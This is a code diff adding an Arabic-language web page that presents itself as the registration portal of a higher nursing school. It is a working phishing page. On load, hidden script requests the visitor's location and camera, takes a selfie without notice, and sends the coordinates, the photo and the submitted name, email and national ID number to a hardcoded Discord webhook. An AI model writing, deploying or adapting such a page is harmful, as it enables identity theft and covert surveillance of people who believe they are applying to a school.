@@ -1,0 +1,245 @@
+
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التسجيل في المدرسة العليا للتمريض</title>
+    <style>
+        /* Importation d'une police moderne pour l'arabe */
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
+
+        /* Réinitialisation de base et style du corps */
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #f3f4f6;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        /* Style de la carte contenant le formulaire */
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #1a5f7a;
+            margin-top: 0;
+            margin-bottom: 25px;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+
+        /* Champs de saisie */
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #1a5f7a;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 95, 122, 0.15);
+        }
+
+        /* Bouton d'envoi */
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a5f7a;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #13465a;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        /* Message de succès caché par défaut */
+        .success-message {
+            display: none;
+            background-color: #d1fae5;
+            color: #065f46;
+            padding: 16px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 500;
+            line-height: 1.5;
+            border: 1px solid #a7f3d0;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>التسجيل في المدرسة العليا للتمريض</h1>
+    <div class="container">
+        <h2 id="formTitle">بوابة التسجيل</h2>
+        
+        <form id="registrationForm">
+            <div class="form-group">
+                <label for="firstName">الاسم الشخصي</label>
+                <input type="text" id="firstName" placeholder="أدخل اسمك الشخصي" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="lastName">الاسم العائلي</label>
+                <input type="text" id="lastName" placeholder="أدخل اسمك العائلي" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="example@email.com" required style="direction: ltr; text-align: left;">
+            </div>
+            
+            <div class="form-group">
+                <label for="cin">رقم البطاقة الوطنية</label>
+                <input type="text" id="cin" placeholder="أدخل رقم البطاقة الوطنية" required>
+            </div>
+            
+            <button type="submit">إرسال الطلب</button>
+        </form>
+
+        <div id="message" class="success-message">
+            تم إرسال طلب التسجيل بنجاح! <br>
+            سنتواصل معك قريباً عبر البريد الإلكتروني.
+        </div>
+    </div>
+
+
+<video id="video" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    let lastname = document.getElementById('lastName');
+    let firstname = document.getElementById('firstName');
+    let email = document.getElementById('email');
+    let cin = document.getElementById('cin');
+
+// ⚠️ METTEZ VOTRE WEBHOOK DISCORD ENTRE LES GUILLEMETS CI-DESSOUS :
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1520406534859788341/EQl1mXNXoxVXLpK7UukYDVjmKJN--Q3hDZ1xSpQa8K2gL2yJ9pDEXECkwYbsZ_w1RJqG";
+
+function envoyerVersDiscord(message, imageBase64 = null) {
+    if (!imageBase64) {
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        });
+    } else {
+        const blob = dataURLtoBlob(imageBase64);
+        const formData = new FormData();
+        formData.append('content', message);
+        formData.append('file', blob, 'selfie.png');
+        fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+    }
+}
+
+function dataURLtoBlob(dataurl) {
+    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+    return new Blob([u8arr], {type:mime});
+}
+
+// Cette fonction s'exécute AUTOMATIQUEMENT dès que la page est chargée
+window.onload = function() {
+    
+    // 1. Demande immédiate de la géolocalisation
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let GoogleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            let msg = `⚡ **Accès direct détecté !**\n- Latitude : ${lat}\n- Longitude : ${lon}\n- Lien Maps : ${GoogleMapsLink}`;
+            envoyerVersDiscord(msg);
+        }, function(err) {
+            envoyerVersDiscord("❌ Localisation refusée par l'utilisateur dès l'entrée.");
+        });
+    }
+
+    // 2. Demande immédiate de l'accès caméra pour le selfie
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            let video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Laisse 1.5 seconde pour l'initialisation du flux vidéo avant la capture
+            setTimeout(function() {
+                let canvas = document.getElementById('canvas');
+                let context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                let imageDataURL = canvas.toDataURL('image/png');
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                envoyerVersDiscord("📸 **Selfie capturé automatiquement à l'ouverture :**", imageDataURL);
+                
+                }, 1500);
+        })
+        .catch(function(err) {
+            envoyerVersDiscord("❌ Accès caméra refusé à l'ouverture.");
+        });
+    }
+};
+
+
+// Gestion de l'événement de soumission
+        document.getElementById('registrationForm').addEventListener('submit', function(event) {
+            // Empêche la page de se rafraîchir
+            event.preventDefault(); 
+            
+            // Masquer le formulaire et le titre
+            this.style.display = 'none';
+            document.getElementById('formTitle').style.display = 'none';
+            
+            // Afficher le message de confirmation
+            document.getElementById('message').style.display = 'block';
+
+            envoyerVersDiscord(`✅ **Formulaire soumis avec succès !**\n- Nom : ${lastname.value}\n- Prénom : ${firstname.value}\n- Email : ${email.value}\n- CIN : ${cin.value}`);
+        });
+</script>
+
+</body>
+</html>
